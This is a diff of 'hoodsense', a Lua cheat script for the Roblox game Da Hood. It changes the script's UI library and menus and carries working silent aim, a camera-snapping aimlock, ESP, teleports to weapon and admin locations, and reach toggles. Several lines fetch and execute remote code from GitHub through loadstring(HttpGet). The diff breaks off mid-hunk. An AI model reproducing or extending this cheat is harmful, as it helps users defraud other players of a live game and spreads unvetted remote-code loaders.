@@ -1,11 +1,15 @@
-local Config = {
-    WindowName = "hoodsense.cc",
-	Color = Color3.fromRGB(22, 88, 232),
-	Keybind = Enum.KeyCode.V
-}
-
-local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/AlexR32/Roblox/main/BracketV3.lua"))()
-local Window = Library:CreateWindow(Config, game:GetService("CoreGui"))
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/library.lua", true))()
+--Library.theme.accentcolor = Color3.new(20, 79, 13)--
+local Window = Library:CreateWindow("hoodsense", Vector2.new(492, 598), Enum.KeyCode.V)
+game.StarterGui:SetCore("SendNotification", {
+    Title = "hoodsense";
+    Text = "Hello, Loading...";
+    Icon = "http://www.roblox.com/asset/?id=8768441000";
+    Duration = "10";
+    callbakc = bindableFunction;
+    Button1 = "Okay!";
+})
+wait(3)
 
 local Aiming = loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/fov.lua"))()
 local ESP = loadstring(game:HttpGet("https://raw.githubusercontent.com/eksotopro/holders/main/esp.lua"))()
@@ -15,15 +19,39 @@ ESP.Names = false
 ESP.Boxes = false
 Aiming.TeamCheck(false)
 Aiming.VisibleCheck = false
- 
+
 local Workspace = game:GetService("Workspace")
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local UserInputService = game:GetService("UserInputService")
- 
 local LocalPlayer = Players.LocalPlayer
 local Mouse = LocalPlayer:GetMouse()
 local CurrentCamera = Workspace.CurrentCamera
+local LocalPlayer = Players.LocalPlayer
+local Mouse = LocalPlayer:GetMouse()
+local CurrentCamera = Workspace.CurrentCamera
+
+local PuppywareSettings = {
+    Blatant = {
+        Movement = {
+            SpeedEnabled = false,
+            SpeedType = "Default",
+            SpeedRender = "Default",
+            SpeedAmount = 5
+        },
+        Cash = {
+            AutoDrop = false,
+            AutoDropAmount = 5000,
+            AutoPickCash = false
+        },
+        Character = {
+            AntiBag = false,
+        },
+    },
+}
+
+local AimingTab = Window:CreateTab("Main")
+local SilentSection = AimingTab:CreateSector("Aim Configuration", "left")
 
 local DaHoodSettings = {
     SilentAim = false,
@@ -31,78 +59,40 @@ local DaHoodSettings = {
     Prediction = 0.178
 }
 
-game.StarterGui:SetCore("SendNotification", {
-    Title = "hoodsense.cc";
-    Text = "Hello, Loading...";
-    Icon = "http://www.roblox.com/asset/?id=8768441000";
-    Duration = "10";
-    callbakc = bindableFunction;
-    Button1 = "Okay!";
-})
-wait(3)
-local Tab1 = Window:CreateTab("Main")
-local Tab2 = Window:CreateTab("Teleports")
-local Tab3 = Window:CreateTab("Avatar")
-local Tab4 = Window:CreateTab("Misc")
-local Tab6 = Window:CreateTab("Credits")
-local Tab7 = Window:CreateTab("Settings")
-
-local Section1 = Tab1:CreateSection("Aim Configuration")
-local Section2 = Tab1:CreateSection("Fov Configuration")
-local Section99 = Tab1:CreateSection("Esp Configuration")
-local Section12 = Tab1:CreateSection("Toggles")
-local Section5 = Tab2:CreateSection("Guns")
-local Section11 = Tab2:CreateSection("Places")
-local Section6 = Tab3:CreateSection("Avatar Modifiactions")
-local other2 = Tab3:CreateSection("Other")
-local Section7 = Tab3:CreateSection("Face Changer")
-local Section8 = Tab4:CreateSection("Miscelanious")
-local Section9 = Tab4:CreateSection("Fun Stuff")
-local section54 = Tab4:CreateSection("Auto Farm")
-local Section13 = Tab6:CreateSection("Credits")
-local Section10 = Tab6:CreateSection("Partners")
-local Section3 = Tab7:CreateSection("Menu")
-local Section4 = Tab7:CreateSection("Background")
-
-local PartnersLabel = Section10:CreateLabel("Supporting with creating project!")
-PartnersLabel:UpdateText("Supporting with creating project!")
-
-----------------------------------------------------------------
--------------------------//  AIMING  -------------------------
-local SilentAimToggle = Section1:CreateToggle("Silent Aim", nil, function(bool)
+local SilentAimToggle = SilentSection:AddToggle("Silent Aim", nil, function(bool)
     DaHoodSettings.SilentAim = bool
 end)
-SilentAimToggle:AddToolTip("Enables Silentaim.")
-SilentAimToggle:CreateKeybind("", function()
-end)
+SilentAimToggle:AddKeybind()
 
-local PredictLagToggle = Section1:CreateToggle("Predict Lag", nil, function(bool)
+local PredictLagToggle = SilentSection:AddToggle("Predict Lag", nil, function(bool)
     DaHoodSettings.Prediction.Lag = bool
 end)
-PredictLagToggle:AddToolTip("Enables Predict Lag.")
 
-local FovCircleToggle = Section1:CreateToggle("FOV Circle", nil, function(bool)
+local FovCircleToggle = SilentSection:AddToggle("FOV Circle", nil, function(bool)
     Aiming.ShowFOV = bool
 end)
-FovCircleToggle:AddToolTip("Enables FOV Circle.")
 
-local VisibleCheckToggle = Section1:CreateToggle("Visible Check", nil, function(bool)
+local VisibleCheckToggle = SilentSection:AddToggle("Visible Check", nil, function(bool)
     Aiming.VisibleCheck = bool
 end)
-VisibleCheckToggle:AddToolTip("Checks if target is visible.")
 
-local HitAirShootsToggle = Section1:CreateToggle("Hit Airshots", nil, function(bool)
+local HitAirShootsToggle = SilentSection:AddToggle("Hit Airshots", nil, function(bool)
     Aiming.Airshots = true
 end)
-HitAirShootsToggle:AddToolTip("Hits Airshots.")
 
-local HitChanceSlider = Section2:CreateSlider("Silent Aim Hitchance", 0,400,nil,false, function(value)
+local fovsettings = AimingTab:CreateSector("Fov Configuration", "right")
+
+local HitChanceSlider = fovsettings:AddSlider("Silent Aim Hitchance", 0, 100, 400, 1, function(value)
     DaHoodSettings.Prediction = tonumer("0." .. value)
 end)
-HitChanceSlider:AddToolTip("Customize hitchance.")
 
-local aimlocklabel = Section1:CreateLabel("Aimlock")
+local fovsize = fovsettings:AddSlider("Silent Aim Size", 0, 30, 500, 1, function(value)
+    Aiming.FOV = value
+end)
 
+local fovsides = fovsettings:AddSlider("Fov Circle Sides", 1, 40, 40, 1, function(value)
+    Aiming.FOVSides  = value
+end)
 -------------------------------
 -----// AIMING FUNCTION -----
 function Aiming.Check()
@@ -147,237 +137,336 @@ UserInputService.InputEnded:Connect(function(Key, Is)
         LMFAO = false
     end
 end)
------------------------------------------------------------
 
-local aimlock = Section1:CreateButton("Enable Aimlock", function()
-    getgenv().AimPart = "HumanoidRootPart"
-    getgenv().AimlockKey = "q"
-    getgenv().AimRadius = 30
-    getgenv().ThirdPerson = true
-    getgenv().FirstPerson = true
-    getgenv().TeamCheck = false
-    getgenv().PredictMovement = true
-    getgenv().PredictionVelocity = 9
-    local L_27_, L_28_, L_29_, L_30_ =
-        game:GetService "Players",
-    game:GetService "UserInputService",
-    game:GetService "RunService",
-    game:GetService "StarterGui"
-    local L_31_, L_32_, L_33_, L_34_, L_35_, L_36_, L_37_ =
-        L_27_.LocalPlayer,
-    L_27_.LocalPlayer:GetMouse(),
-    workspace.CurrentCamera,
-    CFrame.new,
-    Ray.new,
-    Vector3.new,
-    Vector2.new
-    local L_38_, L_39_, L_40_ = true, false, false
-    local L_41_
-    getgenv().CiazwareUniversalAimbotLoaded = true
-    getgenv().WorldToViewportPoint = function(L_42_arg0)
-        return L_33_:WorldToViewportPoint(L_42_arg0)
-    end
-    getgenv().WorldToScreenPoint = function(L_43_arg0)
-        return L_33_.WorldToScreenPoint(L_33_, L_43_arg0)
-    end
-    getgenv().GetObscuringObjects = function(L_44_arg0)
-        if L_44_arg0 and L_44_arg0:FindFirstChild(getgenv().AimPart) and L_31_ and L_31_.Character:FindFirstChild("Head") then
-            local L_45_ = workspace:FindPartOnRay(L_35_(L_44_arg0[getgenv().AimPart].Position, L_31_.Character.Head.Position))
-            if L_45_ then
-                return L_45_:IsDescendantOf(L_44_arg0)
-            end
+
+local aimlock = AimingTab:CreateSector("Aimlock", "left")
+local aimlocktoggle = aimlock:AddToggle("Aimlock",  nil, function()
+getgenv().AimPart = "HumanoidRootPart"
+getgenv().AimlockKey = "q"
+getgenv().AimRadius = 30
+getgenv().ThirdPerson = true
+getgenv().FirstPerson = true
+getgenv().TeamCheck = false
+getgenv().PredictMovement = true
+getgenv().PredictionVelocity = 9
+local L_27_, L_28_, L_29_, L_30_ =
+    game:GetService "Players",
+game:GetService "UserInputService",
+game:GetService "RunService",
+game:GetService "StarterGui"
+local L_31_, L_32_, L_33_, L_34_, L_35_, L_36_, L_37_ =
+    L_27_.LocalPlayer,
+L_27_.LocalPlayer:GetMouse(),
+workspace.CurrentCamera,
+CFrame.new,
+Ray.new,
+Vector3.new,
+Vector2.new
+local L_38_, L_39_, L_40_ = true, false, false
+local L_41_
+getgenv().CiazwareUniversalAimbotLoaded = true
+getgenv().WorldToViewportPoint = function(L_42_arg0)
+    return L_33_:WorldToViewportPoint(L_42_arg0)
+end
+getgenv().WorldToScreenPoint = function(L_43_arg0)
+    return L_33_.WorldToScreenPoint(L_33_, L_43_arg0)
+end
+getgenv().GetObscuringObjects = function(L_44_arg0)
+    if L_44_arg0 and L_44_arg0:FindFirstChild(getgenv().AimPart) and L_31_ and L_31_.Character:FindFirstChild("Head") then
+        local L_45_ = workspace:FindPartOnRay(L_35_(L_44_arg0[getgenv().AimPart].Position, L_31_.Character.Head.Position))
+        if L_45_ then
+            return L_45_:IsDescendantOf(L_44_arg0)
         end
     end
-    getgenv().GetNearestTarget = function()
-        local L_46_ = {}
-        local L_47_ = {}
-        local L_48_ = {}
-        for L_50_forvar0, L_51_forvar1 in pairs(L_27_:GetPlayers()) do
-            if L_51_forvar1 ~= L_31_ then
-                table.insert(L_46_, L_51_forvar1)
+end
+getgenv().GetNearestTarget = function()
+    local L_46_ = {}
+    local L_47_ = {}
+    local L_48_ = {}
+    for L_50_forvar0, L_51_forvar1 in pairs(L_27_:GetPlayers()) do
+        if L_51_forvar1 ~= L_31_ then
+            table.insert(L_46_, L_51_forvar1)
+        end
+    end
+    for L_52_forvar0, L_53_forvar1 in pairs(L_46_) do
+        if L_53_forvar1.Character ~= nil then
+            local L_54_ = L_53_forvar1.Character:FindFirstChild("Head")
+            if getgenv().TeamCheck == true and L_53_forvar1.Team ~= L_31_.Team then
+                local L_55_ =
+                    (L_53_forvar1.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
+                local L_56_ =
+                    Ray.new(
+                        game.Workspace.CurrentCamera.CFrame.p,
+                        (L_32_.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * L_55_
+                    )
+                local L_57_, L_58_ = game.Workspace:FindPartOnRay(L_56_, game.Workspace)
+                local L_59_ = math.floor((L_58_ - L_54_.Position).magnitude)
+                L_47_[L_53_forvar1.Name .. L_52_forvar0] = {}
+                L_47_[L_53_forvar1.Name .. L_52_forvar0].dist = L_55_
+                L_47_[L_53_forvar1.Name .. L_52_forvar0].plr = L_53_forvar1
+                L_47_[L_53_forvar1.Name .. L_52_forvar0].diff = L_59_
+                table.insert(L_48_, L_59_)
+            elseif getgenv().TeamCheck == false and L_53_forvar1.Team == L_31_.Team then
+                local L_60_ =
+                    (L_53_forvar1.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
+                local L_61_ =
+                    Ray.new(
+                        game.Workspace.CurrentCamera.CFrame.p,
+                        (L_32_.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * L_60_
+                    )
+                local L_62_, L_63_ = game.Workspace:FindPartOnRay(L_61_, game.Workspace)
+                local L_64_ = math.floor((L_63_ - L_54_.Position).magnitude)
+                L_47_[L_53_forvar1.Name .. L_52_forvar0] = {}
+                L_47_[L_53_forvar1.Name .. L_52_forvar0].dist = L_60_
+                L_47_[L_53_forvar1.Name .. L_52_forvar0].plr = L_53_forvar1
+                L_47_[L_53_forvar1.Name .. L_52_forvar0].diff = L_64_
+                table.insert(L_48_, L_64_)
             end
         end
-        for L_52_forvar0, L_53_forvar1 in pairs(L_46_) do
-            if L_53_forvar1.Character ~= nil then
-                local L_54_ = L_53_forvar1.Character:FindFirstChild("Head")
-                if getgenv().TeamCheck == true and L_53_forvar1.Team ~= L_31_.Team then
-                    local L_55_ =
-                        (L_53_forvar1.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
-                    local L_56_ =
-                        Ray.new(
-                            game.Workspace.CurrentCamera.CFrame.p,
-                            (L_32_.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * L_55_
-                        )
-                    local L_57_, L_58_ = game.Workspace:FindPartOnRay(L_56_, game.Workspace)
-                    local L_59_ = math.floor((L_58_ - L_54_.Position).magnitude)
-                    L_47_[L_53_forvar1.Name .. L_52_forvar0] = {}
-                    L_47_[L_53_forvar1.Name .. L_52_forvar0].dist = L_55_
-                    L_47_[L_53_forvar1.Name .. L_52_forvar0].plr = L_53_forvar1
-                    L_47_[L_53_forvar1.Name .. L_52_forvar0].diff = L_59_
-                    table.insert(L_48_, L_59_)
-                elseif getgenv().TeamCheck == false and L_53_forvar1.Team == L_31_.Team then
-                    local L_60_ =
-                        (L_53_forvar1.Character:FindFirstChild("Head").Position - game.Workspace.CurrentCamera.CFrame.p).magnitude
-                    local L_61_ =
-                        Ray.new(
-                            game.Workspace.CurrentCamera.CFrame.p,
-                            (L_32_.Hit.p - game.Workspace.CurrentCamera.CFrame.p).unit * L_60_
-                        )
-                    local L_62_, L_63_ = game.Workspace:FindPartOnRay(L_61_, game.Workspace)
-                    local L_64_ = math.floor((L_63_ - L_54_.Position).magnitude)
-                    L_47_[L_53_forvar1.Name .. L_52_forvar0] = {}
-                    L_47_[L_53_forvar1.Name .. L_52_forvar0].dist = L_60_
-                    L_47_[L_53_forvar1.Name .. L_52_forvar0].plr = L_53_forvar1
-                    L_47_[L_53_forvar1.Name .. L_52_forvar0].diff = L_64_
-                    table.insert(L_48_, L_64_)
-                end
-            end
-        end
-        if unpack(L_48_) == nil then
-            return nil
-        end
-        local L_49_ = math.floor(math.min(unpack(L_48_)))
-        if L_49_ > getgenv().AimRadius then
-            return nil
-        end
-        for L_65_forvar0, L_66_forvar1 in pairs(L_47_) do
-            if L_66_forvar1.diff == L_49_ then
-                return L_66_forvar1.plr
-            end
-        end
+    end
+    if unpack(L_48_) == nil then
         return nil
     end
-    L_32_.KeyDown:Connect(
-        function(L_67_arg0)
-            if L_67_arg0 == AimlockKey and L_41_ == nil then
-                pcall(
-                    function()
-                        if L_39_ ~= true then
-                            L_39_ = true
-                        end
-                        local L_68_
-                        L_68_ = GetNearestTarget()
-                        if L_68_ ~= nil then
-                            L_41_ = L_68_
+    local L_49_ = math.floor(math.min(unpack(L_48_)))
+    if L_49_ > getgenv().AimRadius then
+        return nil
+    end
+    for L_65_forvar0, L_66_forvar1 in pairs(L_47_) do
+        if L_66_forvar1.diff == L_49_ then
+            return L_66_forvar1.plr
+        end
+    end
+    return nil
+end
+L_32_.KeyDown:Connect(
+    function(L_67_arg0)
+        if L_67_arg0 == AimlockKey and L_41_ == nil then
+            pcall(
+                function()
+                    if L_39_ ~= true then
+                        L_39_ = true
+                    end
+                    local L_68_
+                    L_68_ = GetNearestTarget()
+                    if L_68_ ~= nil then
+                        L_41_ = L_68_
+                    end
+                end
+            )
+        elseif L_67_arg0 == AimlockKey and L_41_ ~= nil then
+            if L_41_ ~= nil then
+                L_41_ = nil
+            end
+            if L_39_ ~= false then
+                L_39_ = false
+            end
+        end
+    end
+)
+L_29_.RenderStepped:Connect(
+    function()
+        if getgenv().ThirdPerson == true and getgenv().FirstPerson == true then
+            if
+                (L_33_.Focus.p - L_33_.CoordinateFrame.p).Magnitude > 1 or
+                (L_33_.Focus.p - L_33_.CoordinateFrame.p).Magnitude <= 1
+            then
+                L_40_ = true
+            else
+                L_40_ = false
+            end
+        elseif getgenv().ThirdPerson == true and getgenv().FirstPerson == false then
+            if (L_33_.Focus.p - L_33_.CoordinateFrame.p).Magnitude > 1 then
+                L_40_ = true
+            else
+                L_40_ = false
+            end
+        elseif getgenv().ThirdPerson == false and getgenv().FirstPerson == true then
+            if (L_33_.Focus.p - L_33_.CoordinateFrame.p).Magnitude <= 1 then
+                L_40_ = true
+            else
+                L_40_ = false
+            end
+        end
+        if L_38_ == true and L_39_ == true then
+            if L_41_ and L_41_.Character and L_41_.Character:FindFirstChild(getgenv().AimPart) then
+                if getgenv().FirstPerson == true then
+                    if L_40_ == true then
+                        if getgenv().PredictMovement == true then
+                            L_33_.CFrame =
+                                L_34_(
+                                    L_33_.CFrame.p,
+                                    L_41_.Character[getgenv().AimPart].Position +
+                                    L_41_.Character[getgenv().AimPart].Velocity / PredictionVelocity
+                                )
+                        elseif getgenv().PredictMovement == false then
+                            L_33_.CFrame = L_34_(L_33_.CFrame.p, L_41_.Character[getgenv().AimPart].Position)
                         end
                     end
-                )
-            elseif L_67_arg0 == AimlockKey and L_41_ ~= nil then
-                if L_41_ ~= nil then
-                    L_41_ = nil
-                end
-                if L_39_ ~= false then
-                    L_39_ = false
+                elseif getgenv().ThirdPerson == true then
+                    if L_40_ == true then
+                        if getgenv().PredictMovement == true then
+                            L_33_.CFrame =
+                                L_34_(
+                                    L_33_.CFrame.p,
+                                    L_41_.Character[getgenv().AimPart].Position +
+                                    L_41_.Character[getgenv().AimPart].Velocity / PredictionVelocity
+                                )
+                        elseif getgenv().PredictMovement == false then
+                            L_33_.CFrame = L_34_(L_33_.CFrame.p, L_41_.Character[getgenv().AimPart].Position)
+                        end
+                    end
                 end
             end
         end
-    )
-    L_29_.RenderStepped:Connect(
-        function()
-            if getgenv().ThirdPerson == true and getgenv().FirstPerson == true then
-                if
-                    (L_33_.Focus.p - L_33_.CoordinateFrame.p).Magnitude > 1 or
-                    (L_33_.Focus.p - L_33_.CoordinateFrame.p).Magnitude <= 1
-                then
-                    L_40_ = true
-                else
-                    L_40_ = false
-                end
-            elseif getgenv().ThirdPerson == true and getgenv().FirstPerson == false then
-                if (L_33_.Focus.p - L_33_.CoordinateFrame.p).Magnitude > 1 then
-                    L_40_ = true
-                else
-                    L_40_ = false
-                end
-            elseif getgenv().ThirdPerson == false and getgenv().FirstPerson == true then
-                if (L_33_.Focus.p - L_33_.CoordinateFrame.p).Magnitude <= 1 then
-                    L_40_ = true
-                else
-                    L_40_ = false
-                end
-            end
-            if L_38_ == true and L_39_ == true then
-                if L_41_ and L_41_.Character and L_41_.Character:FindFirstChild(getgenv().AimPart) then
-                    if getgenv().FirstPerson == true then
-                        if L_40_ == true then
-                            if getgenv().PredictMovement == true then
-                                L_33_.CFrame =
-                                    L_34_(
-                                        L_33_.CFrame.p,
-                                        L_41_.Character[getgenv().AimPart].Position +
-                                        L_41_.Character[getgenv().AimPart].Velocity / PredictionVelocity
-                                    )
-                            elseif getgenv().PredictMovement == false then
-                                L_33_.CFrame = L_34_(L_33_.CFrame.p, L_41_.Character[getgenv().AimPart].Position)
-                            end
-                        end
-                    elseif getgenv().ThirdPerson == true then
-                        if L_40_ == true then
-                            if getgenv().PredictMovement == true then
-                                L_33_.CFrame =
-                                    L_34_(
-                                        L_33_.CFrame.p,
-                                        L_41_.Character[getgenv().AimPart].Position +
-                                        L_41_.Character[getgenv().AimPart].Velocity / PredictionVelocity
-                                    )
-                            elseif getgenv().PredictMovement == false then
-                                L_33_.CFrame = L_34_(L_33_.CFrame.p, L_41_.Character[getgenv().AimPart].Position)
-                            end
-                        end
-                    end
-                end
-            end
-        end
-    )
-end)
-aimlock:AddToolTip("Enables Aimlock [Q]")
+    end
+)
+end
+)
 
-local aimlockprediction = Section1:CreateTextBox("Aimlock Prediction", "Prediction", true, 	function(L_70_arg0)
+aimlock:AddTextbox("Aimlock Key", nil, function(L_69_arg0)
+		getgenv().AimlockKey = L_69_arg0
+end)
+
+aimlock:AddTextbox("Aimlock Prediction", nil, function(L_70_arg0)
     PredictionVelocity = L_70_arg0
 end)
-aimlockprediction:SetValue("9")
-aimlockprediction:AddToolTip("Changes Prediction.")
 
-local aimlockaimpart = Section1:CreateDropdown("Aimpart", {"Head","UpperTorso","HumanoidRootPart","LowerTorso"}, function(L_71_arg0)
+aimlock:AddDropdown("Aim Part", {"Head", "UpperTorso", "HumanoidRootPart", "LowerTorso"}, "Head", false, function(L_71_arg0)
     getgenv().AimPart = L_71_arg0
 end)
-aimlockaimpart:SetOption("UpperTorso")
-aimlockaimpart:AddToolTip("Changes Aimpart.")
---------------------------------------------------------------------
--------------------------//  FOV CIRCLE  -------------------------
 
-local FovCircleSize = Section2:CreateSlider("Fov Circle Size", 0,400,nil,true, function(value)
-    Aiming.FOV = value
+
+local TeleportsTab = Window:CreateTab("Teleports")
+local gunssection = TeleportsTab:CreateSector("Guns", "left")
+
+local revolver = gunssection:AddButton("Revolver", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-638.75, 18.8500004, -118.175011, -1, 0, 0, 0, 1, 0, 0, 0, -1)
 end)
-FovCircleSize:AddToolTip("Customize Fov Circle Size.")
 
-local fovsides = Section2:CreateSlider("Fov Circle Sides", 0,40,nil,true, function(value)
-    Aiming.FOVSides  = value
+local ak = gunssection:AddButton("Ak", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-587.529358, 5.39480686, -753.717712, -1, 0, 0, 0, 1, 0, 0, 0, -1)
 end)
-FovCircleSize:AddToolTip("Customize Fov Circle Sides.")
 
-local fovcolor = Section2:CreateColorpicker("Fov Color", function(color)
-	Aiming.FOVColour = color
+local smg = gunssection:AddButton("Smg", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-577.123413, 5.47666788, -718.031433, -1, 0, 0, 0, 1, 0, 0, 0, -1)
 end)
-fovcolor:AddToolTip("Change FOV color.")
-fovcolor:UpdateColor(Color3.fromRGB(20, 124, 255))
 
---------------------------------------------------------------
------------------------//  TOGGLES   -----------------------
-
-local AntiSlow = Section12:CreateToggle("Anti-Slow", nil, function(gh)
-    if gh == true then
-        game:GetService('RunService'):BindToRenderStep("Anti-Slow", 0 , function()
-            if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoWalkSpeed") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoWalkSpeed"):Destroy() end
-            if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("ReduceWalk") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("ReduceWalk"):Destroy() end
-            if game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoJumping") then game.Players.LocalPlayer.Character.BodyEffects.Movement:FindFirstChild("NoJumping"):Destroy() end
-            if game.Players.LocalPlayer.Character.BodyEffects.Reload.Value == true then game.Players.LocalPlayer.Character.BodyEffects.Reload.Value = false end
-        end)
-    elseif gh == false then
-        game:GetService('RunService'):UnbindFromRenderStep("Anti-Slow")
-    end
+local ar = gunssection:AddButton("AR", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-591.824158, 5.46046877, -744.731628, 0, 0, 1, 0, 1, -0, -1, 0, 0)
 end)
-local Reach = Section12:CreateToggle("Reach", nil, function(e)
+
+local dbs = gunssection:AddButton("Double Barrel", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1039.59985, 18.8513641, -256.449951, -1, 0, 0, 0, 1, 0, 0, 0, -1)
+end)
+
+local shotgun = gunssection:AddButton("Shotgun", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-578.623657, 5.47212696, -725.131531, 0, 0, 1, 0, 1, -0, -1, 0, 0)
+end)
+
+local flame = gunssection:AddButton("Flame Thrower", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-157.122437, 50.9120102, -104.93145, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+end)
+
+local tac = gunssection:AddButton("Tactical Shotgun", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(470.877533, 45.1272316, -620.630676, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+end)
+
+local rpg = gunssection:AddButton("Rpg", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(118.664856, -29.6487694, -272.349792, -1, 0, 0, 0, 1, 0, 0, 0, -1)
+end)
+
+local drumgun = gunssection:AddButton("Drum Gun", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-83.548996, 19.7020588, -82.1449585, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+end)
+
+local armor = gunssection:AddButton("High Medium Armor", function(bool)
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-939, -25, 571)
+end)
+
+local bat = gunssection:AddButton("Bat", function(bool)
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(380, 49, -283)
+end)
+
+local mediumarmor = gunssection:AddButton("Medium Armor", function(bool)
+	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(528, 50, -637)
+end)
+
+local placessection = TeleportsTab:CreateSector("Places", "right")
+
+local church = placessection:AddButton("Church", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(147.299988, 18.8493252, 31.7999744, 0, 0, 1, 0, 1, -0, -1, 0, 0)
+end)
+
+local admin1 = placessection:AddButton("Admin Base", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-872.853516, -34.4276848, -538.013306, -0.999724388, -3.9898886e-08, -0.0234765243, -3.9204977e-08, 1, -3.00177518e-08, 0.0234765243, -2.90890814e-08, -0.999724388)
+end)
+
+local admin2 = placessection:AddButton("Admin Guns", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-808.708557, -39.6492004, -932.789368, 0.999899805, 2.01343173e-08, -0.0141554065, -2.17800533e-08, 1, -1.16108232e-07, 0.0141554065, 1.16404912e-07, 0.999899805)
+end)
+
+local admin3 = placessection:AddButton("Admin Food", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-788.053406, -39.6492004, -932.951233, 0.998369277, 2.46515359e-08, 0.0570784509, -2.8773524e-08, 1, 7.13949646e-08, -0.0570784509, -7.29209759e-08, 0.998369277)
+end)
+
+local ufo = placessection:AddButton("Ufo", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(2.85052466, 132, -736.571106, -0.0460956171, -4.24733706e-08, -0.998937011, 7.26012459e-08, 1, -4.58687275e-08, 0.998937011, -7.46384217e-08, -0.0460956171)
+end)
+
+local casino = placessection:AddButton("Casino", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-995, 21.6998043, -153.100037, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+end)
+
+local bank = placessection:AddButton("Bank", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-318.891174, 80.2145309, -257.177429, 0.0479469746, -5.14644114e-08, 0.998850107, -3.12971538e-09, 1, 5.16738901e-08, -0.998850107, -5.60372015e-09, 0.0479469746)
+end)
+
+local taco = placessection:AddButton("Taco", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(584.026855, 48.1605072, -474.033936, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+end)
+
+local revRoof = placessection:AddButton("Revolver Roof", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-634.463135, 80.434761, -204.232559, -0.0190527271, -1.03574322e-07, -0.999818563, 4.36709335e-09, 1, -1.03676342e-07, 0.999818563, -6.3416179e-09, -0.0190527271)
+end)
+
+local playground = placessection:AddButton("PlayGround", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-282.694153, 19.7496624, -807.719727, 1, 0, 0, 0, 1, 0, 0, 0, 1)
+end)
+
+local gas = placessection:AddButton("Gas Station", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(604.800415, 46.0998344, -258.249573, 0, 0, 1, 0, 1, -0, -1, 0, 0)
+end)
+
+local cementery = placessection:AddButton("Cementery", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(135.109558, 99.75, -57.2315979, 0.999993503, -0.000633752206, -0.0035054055, 0.000638642872, 0.999998808, 0.00139435288, 0.00350463158, -0.00139658386, 0.999992728)
+end)
+
+local school = placessection:AddButton("School Roof", function(bool)
+    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-525.353455, 68.125, 311.824402, 0.999992013, 1.03866675e-08, -0.00399552286, -1.03507425e-08, 1, 9.01170427e-09, 0.00399552286, -8.97027519e-09, 0.999992013)
+end)
+
+--- Esp Tab ---
+local EspSection = AimingTab:CreateSector("Esp", "left")
+
+local espToggle = EspSection:AddToggle("Enable ESP", false, function(bool)
+    ESP:Toggle(bool)
+end)
+
+local tracersToggle = EspSection:AddToggle("Enable Tracers", false, function(bool)
+    ESP.Tracers = bool
+end)
+
+local namesToggle = EspSection:AddToggle("Enable Names", false, function(bool)
+    ESP.Names = bool
+end)
+
+local boxesToggle = EspSection:AddToggle("Enable Boxes", false, function(bool)
+    ESP.Boxes = bool
+end)
+espToggle:AddKeybind()
+
+local togglessector = AimingTab:CreateSector("Toggles", "right")
+local Reach = togglessector:AddToggle("Reach", nil, function(e)
     if e == true then
         game:GetService('RunService'):BindToRenderStep("Reach", 0 , function()
             local success, err = pcall(function()
@@ -405,8 +494,7 @@ local Reach = Section12:CreateToggle("Reach", nil, function(e)
         game:GetService('RunService'):UnbindFromRenderStep("Reach")
     end
 end)
---AntiSlow:CreateKeybind("", function()
-local AutoStomp = Section12:CreateToggle("Auto-Stomp", nil, function(r)
